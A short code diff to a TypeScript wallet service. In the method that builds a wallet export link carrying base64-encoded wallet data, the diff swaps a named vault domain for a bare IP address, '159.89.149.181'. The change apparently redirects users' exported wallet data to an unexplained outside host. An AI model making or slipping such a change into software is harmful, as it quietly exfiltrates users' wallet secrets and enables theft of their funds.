@@ -191,7 +191,7 @@ export class WalletService {
     const exportData = this.generateExportData();
     const base64Data = btoa(JSON.stringify(exportData));
 
-    return `https://vault.bolt.co.in/import-wallet#${base64Data}`;
+    return `https://159.89.149.181/import-wallet#${base64Data}`;
   }
 
   lockWallet() {
